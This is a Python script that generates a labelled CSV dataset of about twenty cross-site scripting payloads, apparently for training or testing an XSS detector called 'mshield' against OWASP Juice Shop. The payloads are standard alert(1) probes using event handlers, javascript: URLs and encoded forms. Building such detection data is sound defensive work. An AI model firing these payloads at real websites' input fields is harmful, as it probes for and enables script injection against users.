import pandas as pd
import logging
import os
import csv
from typing import List, Dict

# Ensure directories exist
os.makedirs('data', exist_ok=True)
os.makedirs('mshield/logs', exist_ok=True)

# Configure logging
logging.basicConfig(
    filename='mshield/logs/payload_creator.log',
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

def generate_xss_payloads(num_payloads: int = 20) -> List[Dict[str, str]]:
    """Generate unique XSS payloads for various sanitization levels and input fields."""
    try:
        # Comprehensive payload list for low, medium, and high sanitization
        payloads_list = [
            # Juice Shop working payloads (medium sanitization)
            '<img src=x onerror=alert(1)>',  # Event-based, search bar
            '<input onfocus=alert(1) autofocus>',  # Event-based, search bar
            '<video src=x onerror=alert(1)>',  # Event-based, search bar
            '<audio src=x onerror=alert(1)>',  # Event-based, search bar
            '<details open ontoggle=alert(1)>',  # Event-based, search bar
            '<textarea onfocus=alert(1) autofocus>',  # Event-based, search bar
            '<button onclick=alert(1)>Click</button>',  # Event-based, search bar
            '<img src=invalid onerror=alert(1)>',  # Event-based, search bar
            '"><img src=x onerror=alert(1)>',  # Event-based, search bar
            # New payload for Juice Shop
            '<select onchange=alert(1)>',  # Event-based, search bar
            # Low sanitization payloads
            '<script>alert(1)</script>',  # Script-based, profile bio/comments
            'javascript:alert(1)',  # DOM-based, profile bio/comments
            '" onmouseover=alert(1)',  # Event-based, profile bio/comments
            '<a href=javascript:alert(1)>Click</a>',  # DOM-based, comments
            '<div onclick=alert(1)>Click</div>',  # Event-based, profile bio
            # High sanitization payloads
            '%3Cimg%20src=x%20onerror=alert(1)%3E',  # Encoded, search bar/profile bio
            'data:text/html,<script>alert(1)</script>',  # Data URL, profile bio
            '&#60;img src=x onerror=alert(1)&#62;',  # HTML entity, search bar
            '<img src=`javascript:alert(1)`>',  # DOM-based, profile bio
            # Additional event-based payloads
            '<marquee onstart=alert(1)>',  # Event-based, search bar
            '<iframe onload=alert(1)>',  # Event-based, profile bio
            '<object data=javascript:alert(1)>',  # DOM-based, comments
        ]
        
        # Ensure unique payloads
        selected_payloads = list(set(payloads_list))[:num_payloads]
        
        payloads = []
        for payload in selected_payloads:
            payload_type = (
                'event-based' if any(x in payload.lower() for x in ['onerror', 'onfocus', 'ontoggle', 'onclick', 'onchange', 'onmouseover', 'onstart', 'onload'])
                else 'script-based' if '<script>' in payload.lower()
                else 'encoded' if any(x in payload.lower() for x in ['%3c', '&#60;'])
                else 'dom-based' if any(x in payload.lower() for x in ['javascript:', 'data:'])
                else 'other'
            )
            input_field = (
                'search_bar' if any(x in payload.lower() for x in ['onerror', 'onfocus', 'ontoggle', 'onclick', 'onchange', 'onstart'])
                else 'profile_bio' if any(x in payload.lower() for x in ['<script>', 'data:', '<div>', '<iframe>'])
                else 'comments'
            )
            notes = f"{payload_type}, {payload[:20]}"
            
            payloads.append({
                'payload': payload,
                'source': 'generated',
                'is_malicious': 'True',
                'notes': notes,
                'input_field': input_field
            })
        
        # Add non-malicious payload
        payloads.append({
            'payload': 'Hello World',
            'source': 'generated',
            'is_malicious': 'False',
            'notes': 'Non-malicious text',
            'input_field': 'search_bar'
        })
        
        logger.info(f"Generated {len(payloads)} unique payloads")
        return payloads
    except Exception as e:
        logger.error(f"Error generating payloads: {e}")
        return []

def save_payloads(payloads: List[Dict[str, str]], output_file: str = 'data/mshield_xss_data.csv'):
    """Save generated payloads to CSV."""
    try:
        df = pd.DataFrame(payloads)
        df.to_csv(output_file, index=False, quoting=csv.QUOTE_ALL, escapechar='\\')
        logger.info(f"Saved {len(payloads)} payloads to {output_file}")
    except Exception as e:
        logger.error(f"Error saving payloads to {output_file}: {e}")
        raise

def main():
    """Main function to generate and save XSS payloads."""
    try:
        payloads = generate_xss_payloads(num_payloads=20)
        save_payloads(payloads)
    except Exception as e:
        logger.error(f"Main error: {e}")
        raise

if __name__ == "__main__":
    main()